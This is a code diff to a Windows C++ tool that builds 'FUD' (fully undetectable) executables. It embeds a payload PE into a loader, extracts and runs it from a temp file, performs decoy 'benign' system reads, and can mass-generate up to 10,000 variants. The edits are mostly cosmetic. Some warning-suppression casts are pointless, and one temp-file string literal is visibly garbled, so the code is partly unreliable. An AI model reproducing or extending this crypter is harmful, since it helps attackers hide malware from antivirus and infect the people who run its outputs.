@@ -91,13 +91,8 @@ enum EncryptionType {
     ENCRYPT_CHACHA20 = 3        // ChaCha20 encryption (modern, secure)
 };
 
-// Add at the very top of the file, after includes
-#ifdef _WIN32
-#include <tlhelp32.h>
-#include <tchar.h>
-
 // Function to kill running instances before build
-void killRunningInstances() {
+static void killRunningInstances() {
     HANDLE hProcessSnap;
     PROCESSENTRY32 pe32;
     
@@ -382,6 +377,7 @@ void performBenignOperations() {
     DWORD version = GetVersion();
     char computerName[MAX_COMPUTERNAME_LENGTH + 1] = {0};
     DWORD nameSize = sizeof(computerName);
+    (void)nameSize; // Suppress unused variable warning
     GetComputerNameA(computerName, &nameSize);
     
     // Read common registry keys (non-destructive)
@@ -1164,6 +1160,7 @@ bool extractAndExecuteOriginalPE() {
         // Create temporary file with random name
         char tempPath[MAX_PATH] = {0};
         GetTempPathA(MAX_PATH, tempPath);
+        (void)tempPath; // Suppress unused variable warning
         std::string tempFile = std::string(tempPath) + "tmp_)" + randomEngine.generateRandomName(12) + R"(.exe";
         
         // Write original PE to temp file
@@ -1466,7 +1463,7 @@ exit /b 1
         return result;
     }
     
-private:
+public:
     std::vector<uint8_t> generateMinimalPEExecutable(const std::string& payload) {
         // REAL INTERNAL COMPILER - NO EXTERNAL TOOLS NEEDED!
         // Uses pre-built minimal PE loader, patches it with payload
@@ -1494,8 +1491,8 @@ private:
                 }
             };
             
-            poke32(PAYLOAD_SIZE_OFFSET, static_cast<uint32_t>(payload.size()));    // size
-            poke32(PAYLOAD_RVA_OFFSET, static_cast<uint32_t>(payloadOffset));     // RVA (=file offset here)
+            poke32(PAYLOAD_SIZE_OFFSET, static_cast<uint32_t>(payload.size() & 0xFFFFFFFF));    // size
+            poke32(PAYLOAD_RVA_OFFSET, static_cast<uint32_t>(payloadOffset & 0xFFFFFFFF));     // RVA (=file offset here)
 
             return exe;   // finished PE bytes - REAL WORKING EXECUTABLE!
             
@@ -2619,6 +2616,7 @@ static void startMassGeneration() {
     wchar_t countBuffer[10] = {0};
     GetWindowTextW(g_hMassCountEdit, countBuffer, 10);
     int count = _wtoi(countBuffer);
+    (void)countBuffer; // Suppress unused variable warning
     
     if (count <= 0 || count > 10000) {
         MessageBoxW(NULL, L"Please enter a valid count (1-10000)", L"Invalid Count", MB_OK | MB_ICONWARNING);
@@ -2665,6 +2663,7 @@ static std::string browseForFile(HWND hwnd, bool save = false) {
     char szFile[260] = {0};
     
     ZeroMemory(&ofn, sizeof(ofn));
+    (void)szFile; // Suppress unused variable warning
     ofn.lStructSize = sizeof(ofn);
     ofn.hwndOwner = hwnd;
     ofn.lpstrFile = szFile;
@@ -2693,6 +2692,7 @@ static void createFUDStubOnly() {
     wchar_t outputBuffer[MAX_PATH] = {0};
     GetWindowTextW(g_hOutputPath, outputBuffer, MAX_PATH);
     std::string outputPath = wstringToString(std::wstring(outputBuffer));
+    (void)outputBuffer; // Suppress unused variable warning
     
     if (outputPath.empty()) {
         // Auto-generate output path
@@ -2762,6 +2762,8 @@ static void createFUDExecutable() {
     
     std::string inputPath = wstringToString(std::wstring(inputBuffer));
     std::string outputPath = wstringToString(std::wstring(outputBuffer));
+    (void)inputBuffer; // Suppress unused variable warning
+    (void)outputBuffer; // Suppress unused variable warning
     
     // DEBUG: Log paths
     entryLog.open("debug_entry_points.txt", std::ios::app);
@@ -3020,6 +3022,7 @@ static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM l
             if (DragQueryFileW(hDrop, 0, droppedFile, MAX_PATH)) {
                 SetWindowTextW(g_hInputPath, droppedFile);
             }
+            (void)droppedFile; // Suppress unused variable warning
             
             DragFinish(hDrop);
             break;
